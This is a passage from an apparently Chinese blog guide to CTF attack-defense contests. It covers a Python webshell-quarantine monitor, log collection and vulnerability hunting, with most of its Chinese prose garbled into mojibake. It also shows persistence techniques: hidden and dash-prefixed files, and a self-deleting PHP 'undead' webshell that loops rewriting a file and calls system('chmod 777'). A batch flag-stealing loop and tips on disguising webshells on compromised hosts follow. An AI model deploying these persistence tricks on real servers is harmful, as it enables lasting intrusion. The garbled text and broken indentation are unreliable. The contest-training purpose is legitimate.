value</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(value, basestring):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> unicode(value, encoding <span class="keyword">or</span> UNICODE_ENCODING)</span><br><span class="line">            <span class="keyword">except</span> UnicodeDecodeError, ex:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">return</span> unicode(value, UNICODE_ENCODING)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    value = value[:ex.start] + <span class="string">&quot;&quot;</span>.join(INVALID_UNICODE_CHAR_FORMAT % <span class="built_in">ord</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> value[ex.start:ex.end]) + value[ex.end:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> unicode(value)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">return</span> unicode(<span class="built_in">str</span>(value), errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›®å½•åˆ›å»º</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mkdir_p</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">import</span> errno</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.makedirs(path)</span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> exc:</span><br><span class="line">        <span class="keyword">if</span> exc.errno == errno.EEXIST <span class="keyword">and</span> os.path.isdir(path):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å½“å‰æ‰€æœ‰æ–‡ä»¶è·¯å¾„</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getfilelist</span>(<span class="params">cwd</span>):</span><br><span class="line">    filelist = []</span><br><span class="line">    <span class="keyword">for</span> root,subdirs, files <span class="keyword">in</span> os.walk(cwd):</span><br><span class="line">        <span class="keyword">for</span> filepath <span class="keyword">in</span> files:</span><br><span class="line">            originalfile = os.path.join(root, filepath)</span><br><span class="line">            <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> originalfile:</span><br><span class="line">                filelist.append(originalfile)</span><br><span class="line">    <span class="keyword">return</span> filelist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—æœºæ–‡ä»¶MD5å€¼</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calcMD5</span>(<span class="params">filepath</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filepath,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            md5obj = hashlib.md5()</span><br><span class="line">            md5obj.update(f.read())</span><br><span class="line">            <span class="built_in">hash</span> = md5obj.hexdigest()</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">hash</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">u&#x27;[!] getmd5_error : &#x27;</span> + getUnicode(filepath)</span><br><span class="line">        <span class="built_in">print</span> getUnicode(e)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ORIGIN_FILE_LIST.remove(filepath)</span><br><span class="line">            FILE_MD5_DICT.pop(filepath, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">except</span> KeyError, e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–æ‰€æœ‰æ–‡ä»¶MD5</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getfilemd5dict</span>(<span class="params">filelist = []</span>):</span><br><span class="line">    filemd5dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> ori_file <span class="keyword">in</span> filelist:</span><br><span class="line">        <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> ori_file:</span><br><span class="line">            md5 = calcMD5(os.path.realpath(ori_file))</span><br><span class="line">            <span class="keyword">if</span> md5:</span><br><span class="line">                filemd5dict[ori_file] = md5</span><br><span class="line">    <span class="keyword">return</span> filemd5dict</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤‡ä»½æ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backup_file</span>(<span class="params">filelist=[]</span>):</span><br><span class="line">    <span class="comment"># if len(os.listdir(Special_path[&#x27;bak&#x27;])) == 0:</span></span><br><span class="line">    <span class="keyword">for</span> filepath <span class="keyword">in</span> filelist:</span><br><span class="line">        <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> filepath:</span><br><span class="line">            shutil.copy2(filepath, Special_path[<span class="string">&#x27;bak&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">u&#x27;---------start------------&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> Special_path:</span><br><span class="line">        mkdir_p(Special_path[value])</span><br><span class="line">    <span class="comment"># è·å–æ‰€æœ‰æ–‡ä»¶è·¯å¾„ï¼Œå¹¶è·å–æ‰€æœ‰æ–‡ä»¶çš„MD5ï¼ŒåŒæ—¶å¤‡ä»½æ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line">    ORIGIN_FILE_LIST = getfilelist(CWD)</span><br><span class="line">    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">    backup_file(ORIGIN_FILE_LIST) <span class="comment"># TODO å¤‡ä»½æ–‡ä»¶å¯èƒ½ä¼šäº§ç”Ÿé‡åBUG</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">u&#x27;[*] pre work end!&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        file_list = getfilelist(CWD)</span><br><span class="line">        <span class="comment"># ç§»é™¤æ–°ä¸Šä¼ æ–‡ä»¶</span></span><br><span class="line">        diff_file_list = <span class="built_in">list</span>(<span class="built_in">set</span>(file_list) ^ <span class="built_in">set</span>(ORIGIN_FILE_LIST))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(diff_file_list) != <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># import pdb;pdb.set_trace()</span></span><br><span class="line">            <span class="keyword">for</span> filepath <span class="keyword">in</span> diff_file_list:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    f = <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">                <span class="keyword">except</span> Exception, e:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[*] webshell find : &#x27;</span> + getUnicode(filepath)</span><br><span class="line">                        shutil.move(filepath, os.path.join(Special_path[<span class="string">&#x27;webshell&#x27;</span>], ntpath.basename(filepath) + <span class="string">&#x27;.txt&#x27;</span>))</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;</span>%getUnicode(filepath)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        f = <span class="built_in">open</span>(os.path.join(Special_path[<span class="string">&#x27;log&#x27;</span>], <span class="string">&#x27;log.txt&#x27;</span>), <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">                        f.write(<span class="string">&#x27;newfile: &#x27;</span> + getUnicode(filepath) + <span class="string">&#x27; : &#x27;</span> + <span class="built_in">str</span>(time.ctime()) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                        f.close()</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[-] log error : file move error: &#x27;</span> + getUnicode(e)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># é˜²æ­¢ä»»æ„æ–‡ä»¶è¢«ä¿®æ”¹,è¿˜åŸè¢«ä¿®æ”¹æ–‡ä»¶</span></span><br><span class="line">        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">        <span class="keyword">for</span> filekey <span class="keyword">in</span> md5_dict:</span><br><span class="line">            <span class="keyword">if</span> md5_dict[filekey] != FILE_MD5_DICT[filekey]:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    f = <span class="built_in">open</span>(filekey, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">                <span class="keyword">except</span> Exception, e:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[*] file had be change : &#x27;</span> + getUnicode(filekey)</span><br><span class="line">                        shutil.move(filekey, os.path.join(Special_path[<span class="string">&#x27;difffile&#x27;</span>], ntpath.basename(filekey) + <span class="string">&#x27;.txt&#x27;</span>))</span><br><span class="line">                        shutil.move(os.path.join(Special_path[<span class="string">&#x27;bak&#x27;</span>], ntpath.basename(filekey)), filekey)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;</span>%getUnicode(filekey)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        f = <span class="built_in">open</span>(os.path.join(Special_path[<span class="string">&#x27;log&#x27;</span>], <span class="string">&#x27;log.txt&#x27;</span>), <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">                        f.write(<span class="string">&#x27;diff_file: &#x27;</span> + getUnicode(filekey) + <span class="string">&#x27; : &#x27;</span> + getUnicode(time.ctime()) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                        f.close()</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[-] log error : done_diff: &#x27;</span> + getUnicode(filekey)</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># print &#x27;[*] &#x27; + getUnicode(time.ctime()) </span></span><br></pre></td></tr></table></figure><p>å¼±å£ä»¤æ’æŸ¥å³æ˜¯ä¸»åŠæ–¹ç»™çš„æœåŠ¡å™¨ä¸ºå¼±å£ä»¤ï¼Œæˆ–è€…è‡ªå·±æœåŠ¡å™¨å†…éƒ¨WebæœåŠ¡å†…å­˜åœ¨å¼±å£ä»¤ï¼Œé’ˆå¯¹è¿™ç§æƒ…å†µä¸€å®šè¦åŠæ—¶æ›´æ”¹å¼±å£ä»¤ï¼Œåšå¥½å¼±å£ä»¤æ£€æŸ¥ã€‚</p><p>nmap æ‰«æ 22<br><code>hydra -user -p</code><br>å­—å…¸ç”Ÿæˆå·¥å…·: <a href="https://blog.csdn.net/qq_33936481/article/details/51277679">å‚è€ƒç½‘ç«™</a></p><h2 id="æ—¥å¿—åˆ†æ"><a href="#æ—¥å¿—åˆ†æ" class="headerlink" title="æ—¥å¿—åˆ†æ:"></a>æ—¥å¿—åˆ†æ:</h2><p>åœ¨çº¿ä¸‹æ”»é˜²æ¨¡å¼ä¸­æ—¥å¿—åˆ†ææ˜¯éå¸¸é‡è¦çš„ä¸€ç¯ï¼Œæ—¥å¿—åˆ†æä¸€èˆ¬æ˜¯åœ¨æ¯”èµ›æ­£å¼å¼€å§‹ä¹‹åè¿›è¡Œçš„å¯¹å…¶ä»–æ”»å‡»è€…çš„æµé‡è¿›è¡Œåˆ†ææå–æœ‰ç”¨çš„ä¿¡æ¯ï¼Œé€šè¿‡æŸ¥çœ‹å…¶ä»–é˜Ÿä¼æ‰“è¿‡æ¥çš„æµé‡å¯ä»¥åˆ†æåˆ°ä»–ä»¬ç•™ä¸‹çš„WebShellæ–‡ä»¶åã€æ¼æ´åˆ©ç”¨æ–¹å¼ã€æ¼æ´äº§ç”Ÿçš„ç‚¹ï¼Œæ–¹ä¾¿è‡ªå·±è¿›è¡Œæ”»å‡»ã€‚å› ä¸ºä¸»åŠæ–¹å¯èƒ½ä¼šä¸å…è®¸é€‰æ‰‹æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶ï¼Œå†åŠ ä¸Šæ—¥å¿—æ–‡ä»¶ä¸ä¼šå¯¹POSTçš„æ•°æ®è¿›è¡Œåˆ†ææ‰“å°ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¿›è¡Œæ—¥å¿—ç›‘æ§ã€æµé‡åˆ†ææ—¶ï¼Œä¸€å®šè¦æå‰å‡†å¤‡å¥½è‡ªå·±çš„ç›‘æ§è„šæœ¬ï¼Œå¯¹WebæœåŠ¡è¿›è¡Œç›‘æ§ã€åˆ†æï¼Œè¿™æ ·æ‰å¯ä»¥æŠ“å–åˆ°å®Œæ•´çš„å…¶ä»–é˜Ÿä¼æ‰“è¿‡æ¥çš„æµé‡ï¼Œæ–¹ä¾¿è‡ªå·±å®¡æŸ¥ã€‚</p><h3 id="æ—¥å¿—åˆ†æçš„ç”¨é€”"><a href="#æ—¥å¿—åˆ†æçš„ç”¨é€”" class="headerlink" title="æ—¥å¿—åˆ†æçš„ç”¨é€”"></a>æ—¥å¿—åˆ†æçš„ç”¨é€”</h3><p>æ„ŸçŸ¥å¯èƒ½æ­£åœ¨å‘ç”Ÿçš„æ”»å‡»ï¼Œä»è€Œè§„é¿å­˜åœ¨çš„å®‰å…¨é£é™©<br>åº”æ€¥å“åº”ï¼Œè¿˜åŸæ”»å‡»è€…çš„æ”»å‡»è·¯å¾„ï¼Œä»è€ŒæŒ½å›å·²ç»é€ æˆçš„æŸå¤±<br>è®°å½•logè„šæœ¬<br>è¿™ç§è„šæœ¬ç½‘ä¸Šæœ‰å¾ˆå¤šã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span class="line"><span class="variable">$ip</span>       = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]; <span class="comment">//è®°å½•è®¿é—®è€…çš„ip</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>];<span class="comment">//è®¿é—®è€…è¦è®¿é—®çš„æ–‡ä»¶å</span></span><br><span class="line"><span class="variable">$parameter</span>   = <span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>]; <span class="comment">//è®¿é—®è€…è¦è¯·æ±‚çš„å‚æ•°</span></span><br><span class="line"><span class="variable">$time</span>     =   <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>,<span class="title function_ invoke__">time</span>()); <span class="comment">//è®¿é—®æ—¶é—´</span></span><br><span class="line"><span class="variable">$logadd</span> = <span class="string">&#x27;æ¥è®¿æ—¶é—´ï¼š&#x27;</span>.<span class="variable">$time</span>.<span class="string">&#x27;--&gt;&#x27;</span>.<span class="string">&#x27;è®¿é—®é“¾æ¥ï¼š&#x27;</span>.<span class="string">&#x27;http://&#x27;</span>.<span class="variable">$ip</span>.<span class="variable">$filename</span>.<span class="string">&#x27;?&#x27;</span>.<span class="variable">$parameter</span>.<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// logè®°å½•</span></span><br><span class="line"><span class="variable">$fh</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;log.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fh</span>, <span class="variable">$logadd</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fh</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h3 id="æ—¥å¿—åˆ†æå·¥å…·"><a href="#æ—¥å¿—åˆ†æå·¥å…·" class="headerlink" title="æ—¥å¿—åˆ†æå·¥å…·:"></a>æ—¥å¿—åˆ†æå·¥å…·:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LogForensics è…¾è®¯å®éªŒå®¤</span><br><span class="line">https://security.tencent.com/index.php/opensource/detail/15</span><br><span class="line">åŒ—é£é£˜ç„¶@é‡‘ä¹Œç½‘ç»œå®‰å…¨å®éªŒå®¤</span><br><span class="line">http://www.freebuf.com/sectool/126698.html</span><br><span class="line">ç½‘ç»œIDä¸ºpiaoxçš„å®‰å…¨ä»ä¸šäººå‘˜ï¼š</span><br><span class="line">http://www.freebuf.com/sectool/110644.html</span><br><span class="line">ç½‘ç»œIDï¼šSecSky</span><br><span class="line">http://www.freebuf.com/sectool/8982.html</span><br><span class="line">ç½‘ç»œIDï¼šé¬¼é­…ç¾Šç¾”</span><br><span class="line">http://www.freebuf.com/articles/web/96675.html </span><br></pre></td></tr></table></figure><h2 id="æ¼æ´æŒ–æ˜"><a href="#æ¼æ´æŒ–æ˜" class="headerlink" title="æ¼æ´æŒ–æ˜"></a>æ¼æ´æŒ–æ˜</h2><p>åœ¨CTFæ”»é˜²èµ›ä¸­ï¼Œæ¯”èµ›çš„è¯­è¨€ä»¥PHPå±…å¤šï¼Œæ¼æ´çš„ç±»å‹ä¸»è¦ä¸ºåé—¨æ¼æ´ã€æ³¨å…¥ç±»å‹ã€æ–‡ä»¶ä¸Šä¼ ã€æ–‡ä»¶åŒ…å«ã€ä»£ç æ‰§è¡Œã€å‘½ä»¤æ‰§è¡Œæˆ–äº’è”ç½‘å·²å…¬å¼€çš„å·²çŸ¥CMSæ¼æ´ã€‚å› æ­¤åœ¨æ¯”èµ›ä¸­ï¼Œæ¼æ´æŒ–æ˜ä¸»è¦æ˜¯ä»¥è¿™å‡ ç§æ¼æ´ä¸ºä¸»ã€‚</p><p>æ¼æ´æŒ–æ˜é˜¶æ®µï¼Œé¦–å…ˆå°†å¤‡ä»½çš„æºä»£ç ä½¿ç”¨Dç›¾è¿›è¡ŒæŸ¥æ€ï¼Œç­›é€‰å‡ºDç›¾æ‰«æå‡ºçš„æœ¨é©¬æ–‡ä»¶ç„¶ååœ¨æœåŠ¡å™¨ä¸Šå°†å…¶åˆ é™¤ã€‚å¯¹äºå…¶ä»–ç±»å‹çš„æ¼æ´ï¼Œä¸»è¦è¿˜æ˜¯é€šè¿‡ç™½ç›’ä¸é»‘ç›’æ–¹å¼è¿›è¡Œæ¼æ´æŒ–æ˜ã€‚é»‘ç›’çš„æ–¹å¼ä¸æ¸—é€æµ‹è¯•æœ‰ç‚¹ç›¸ä¼¼ï¼Œè€Œç™½ç›’æµ‹è¯•ä¸­ï¼Œç¬”è€…ä½¿ç”¨çš„å·¥å…·ä¸ºâ€œSeayæºä»£ç å®¡è®¡ç³»ç»Ÿâ€ï¼Œæ ¹æ®å·¥å…·åˆ—å‡ºçš„æ¼æ´æè¿°å»å°½å¯èƒ½æ‰¾ä¸Šè¿°çš„æ¼æ´ç±»å‹</p><h2 id="æƒé™ç»´æŒ"><a href="#æƒé™ç»´æŒ" class="headerlink" title="æƒé™ç»´æŒ"></a>æƒé™ç»´æŒ</h2><ol><li>ç”Ÿæˆâ€œ.â€å¼€å¤´çš„éšè—æ–‡ä»¶ã€‚</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;.config.php&#x27;</span>, <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);    </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><ol start="2"><li>ç”Ÿæˆâ€œ-â€å¼€å¤´çš„æ–‡ä»¶ã€‚</li></ol><p>-å¼€å¤´çš„æ–‡ä»¶ï¼Œå¦‚æœä½¿ç”¨rmç›´æ¥åˆ é™¤ï¼Œå°†æ— æ³•åˆ é™¤ï¼Œå› ä¸ºrmå‘½ä»¤å°†ä¼šæŠŠ-åé¢çš„å­—ç¬¦ä¸²å½“ä½œå‚æ•°å»æ‰§è¡Œã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@JD:~/test<span class="comment"># echo &quot;123&quot; &gt; -test.php</span></span><br><span class="line">root@JD:~/test<span class="comment"># rm -test.php </span></span><br><span class="line"><span class="built_in">rm</span>: invalid option -- <span class="string">&#x27;t&#x27;</span></span><br><span class="line">Try <span class="string">&#x27;rm ./-test.php&#x27;</span> to remove the file <span class="string">&#x27;-test.php&#x27;</span>.</span><br><span class="line">Try <span class="string">&#x27;rm --help&#x27;</span> <span class="keyword">for</span> more information.</span><br><span class="line">root@JD:~/test<span class="comment"># </span></span><br></pre></td></tr></table></figure><ol start="3"><li>ä½¿ç”¨ä¸æ­»é©¬ã€‚</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;.config.php&#x27;</span>, <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;chmod 777 .config.php&#x27;</span>); </span><br><span class="line">    <span class="title function_ invoke__">touch</span>(<span class="string">&quot;.config.php&quot;</span>, <span class="title function_ invoke__">mktime</span>(<span class="number">20</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">17</span>,<span class="number">2017</span>)); </span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">100</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç çš„æ„æ€ä¸ºï¼šé¦–å…ˆä»£ç è®¾ç½®ç¨‹åºæ°¸ä¹…æ‰§è¡Œç›´åˆ°ç¨‹åºç»“æŸï¼Œå¹¶ä¸”å®¢æˆ·ç«¯å…³é—­åä»ç„¶å¯ä»¥æ‰§è¡ŒPHPä»£ç ï¼Œå¯ä¿æŒPHPè¿›ç¨‹ä¸€ç›´åœ¨æ‰§è¡Œã€‚ç„¶ååˆ é™¤è‡ªå·±åè¿›å…¥å¾ªç¯ï¼Œå¾ªç¯ç”Ÿæˆæœ¨é©¬æ–‡ä»¶ã€‚ç”±äºæºæœ¨é©¬å·²è‡ªåˆ é™¤ï¼Œä¸”å·²æ³¨å…¥å†…å­˜ä¸­æ‰§è¡Œï¼Œæƒ³è®©ç¨‹åºåœæ­¢ï¼Œåªèƒ½æ˜¯é‡å¯æœåŠ¡ï¼Œæˆ–è€…æ‰¾å‡ºæ­¤ç¨‹åºçš„è¿›ç¨‹ç„¶åkillã€‚</p><p>ä¹Ÿå¯ä½¿ç”¨ä¸æ­»é©¬ç”Ÿæˆâ€œ-â€å¼€å¤´çš„æœ¨é©¬æ–‡ä»¶</p><h2 id="è‡ªåŠ¨åŒ–æ”»å‡»"><a href="#è‡ªåŠ¨åŒ–æ”»å‡»" class="headerlink" title="è‡ªåŠ¨åŒ–æ”»å‡»"></a>è‡ªåŠ¨åŒ–æ”»å‡»</h2><p>è‡ªåŠ¨åŒ–æ”»å‡»åœ¨CTFçº¿ä¸‹æ”»é˜²èµ›çš„ä½“ç°æ˜¯è‡ªåŠ¨åŒ–æ‰“payloadè·å–åˆ°Flagç„¶åè‡ªåŠ¨æäº¤çš„è¿‡ç¨‹</p><p>æ‰¹é‡æ”»å‡»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Starting attack framework...&quot;</span></span><br><span class="line">    round_time = <span class="number">60</span> * <span class="number">5</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Round time : %s seconds...&quot;</span> % (round_time)</span><br><span class="line">    wait_time = round_time / <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Wait time : %s seconds...&quot;</span> % (wait_time)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   exploit_all()</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;[+] This round is finished , waiting for the next round...&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(wait_time):</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;[+] The next attack is %d seconds later...&quot;</span> % (wait_time - i)</span><br><span class="line">   time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">host, port</span>):</span><br><span class="line">    flag = get_flag(host, port)</span><br><span class="line">    submit_flag(flag, token)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit_all</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;targets&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    host = line.split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    port = <span class="built_in">int</span>(line.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Exploiting : %s:%d&quot;</span> % (host, port)</span><br><span class="line">    exploit(host, port) </span><br></pre></td></tr></table></figure><h3 id="RCE-ä¹‹å"><a href="#RCE-ä¹‹å" class="headerlink" title="RCE ä¹‹å"></a>RCE ä¹‹å</h3><h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><p>webshellæœ€å¥½æœ‰ä¸€å®šçš„ä¼ªè£…æ€§ï¼Œæ–‡ä»¶åå¯ä»¥ä»¥ . å¼€å¤´ã€‚<br>å¯¹äºä¸åŒè‚‰é¸¡ä¸Šçš„webshellè®¾ç½®ä¸åŒå¯†ç ï¼Œé˜²æ­¢åˆ«äººç”¨ä½ çš„é©¬æ¥æ”¶flagã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 